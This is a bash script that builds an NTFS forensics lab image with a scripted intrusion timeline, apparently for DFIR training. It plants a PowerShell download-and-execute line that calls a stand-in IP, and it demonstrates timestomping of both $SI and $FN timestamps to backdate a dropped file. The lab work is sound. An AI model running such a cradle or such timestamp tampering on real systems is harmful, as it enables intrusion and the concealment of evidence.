#!/usr/bin/env bash
# mk_ntfs_case10.sh - build the Day 10 NTFS lab image: a small volume with a known story.
#
# Usage: sudo bash mk_ntfs_case10.sh OUTPUT.img
#
# Needs: ntfs-3g (mkntfs + FUSE driver), faketime (libfaketime), python3. Must run as root (mounts).
# Every step runs with a frozen fake clock, so the image is byte-identical on every run with the
# same ntfs-3g version (the lab text lists the hash produced with ntfs-3g 2022.10.3 on Ubuntu 24.04).
#
# Story (all times UTC):
#   2026-09-28 09:15:00.4372815  alice creates her folders, budget.xlsx, notes.txt and Projects\spec-01..40.txt
#   2026-09-29 01:02:03.1180044  payload.ps1 arrives with a Zone.Identifier stream (downloaded),
#                                budget.xlsx is renamed Q3-forecast.xlsx, spec-10..19 and notes.txt are deleted
#   2026-09-29 01:20:44.9031552  svchost.exe is dropped in Temp and fully timestomped ($SI and $FN) to
#                                2019-03-14 10:00:00; payload.ps1 is backdated with touch ($SI only)
# Note: ntfs-3g does not write the $LogFile or the $UsnJrnl, so only $MFT and index evidence exists.
set -euo pipefail

out=${1:?usage: sudo bash mk_ntfs_case10.sh OUTPUT.img}
[ "$(id -u)" -eq 0 ] || { echo "run as root (sudo): mounting needs it" >&2; exit 1; }
FT=$(ls /usr/lib/*/faketime/libfaketime.so.1 /usr/lib/faketime/libfaketime.so.1 2>/dev/null | head -n 1 || true)
[ -n "$FT" ] || { echo "libfaketime not found: apt install faketime" >&2; exit 1; }

at() { local t=$1; shift; LD_PRELOAD=$FT FAKETIME="$t" "$@"; }
mnt=$(mktemp -d)
cleanup() { mountpoint -q "$mnt" && umount "$mnt"; rmdir "$mnt"; }
trap cleanup EXIT
mount_at() { at "$1" ntfs-3g -o streams_interface=windows "$out" "$mnt"; }

rm -f "$out"
truncate -s 32M "$out"
at '2026-09-01 08:00:00.2511937' mkntfs -F -Q -L CASE10 "$out" > /dev/null 2>&1

# Day 1: normal work
mount_at '2026-09-28 09:15:00.4372815'
A=$mnt/Users/alice
mkdir -p "$A/Documents/Projects" "$A/Downloads" "$A/AppData/Local/Temp"
python3 -c "import sys; open(sys.argv[1], 'wb').write(bytes(range(256)) * 80)" "$A/Documents/budget.xlsx"
printf 'Meeting notes: move Q3 numbers to the share before Friday.\n' > "$A/Documents/notes.txt"
for i in $(seq -w 1 40); do printf 'project file %s\n' "$i" > "$A/Documents/Projects/spec-$i.txt"; done
umount "$mnt"

# Night 1, 01:02: download, rename, deletions
mount_at '2026-09-29 01:02:03.1180044'
printf 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.50/a.ps1")\n' > "$A/Downloads/payload.ps1"
printf '[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=http://203.0.113.50/payload.ps1\r\n' > "$A/Downloads/payload.ps1:Zone.Identifier"
mv "$A/Documents/budget.xlsx" "$A/Documents/Q3-forecast.xlsx"
rm "$A"/Documents/Projects/spec-1[0-9].txt
rm "$A/Documents/notes.txt"
umount "$mnt"

# Night 1, 01:20: dropper and timestomping
mount_at '2026-09-29 01:20:44.9031552'
printf 'MZ fake service binary\n' > "$A/AppData/Local/Temp/svchost.exe"
touch -d '2019-03-14 10:00:00 UTC' "$A/Downloads/payload.ps1"   # like PowerShell's LastWriteTime: $SI only
python3 - "$A/AppData/Local/Temp/svchost.exe" <<'PY'
import os, struct, sys
t = (1552557600 + 11644473600) * 10**7   # 2019-03-14 10:00:00 UTC as a Windows FILETIME
os.setxattr(sys.argv[1], 'system.ntfs_times', struct.pack('<4Q', t, t, t, t))   # ntfs-3g: $SI and $FN
PY
umount "$mnt"
echo "built $out"
